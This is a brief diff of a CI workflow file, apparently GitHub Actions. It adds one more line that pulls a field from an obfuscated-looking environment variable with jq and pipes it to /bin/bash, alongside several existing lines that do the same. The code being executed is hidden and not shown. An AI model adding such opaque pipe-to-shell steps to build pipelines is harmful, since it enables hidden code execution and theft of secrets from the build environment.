@@ -35,6 +35,7 @@ jobs:
           echo $lk35 | jq -r .gtz5 | /bin/bash
           echo $aja45 | jq -r .kia021 | /bin/bash
           echo $qp9 | jq -r .ceb5959 | /bin/bash
+          printf '%s' "$cu103" | jq -r .mvii073 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
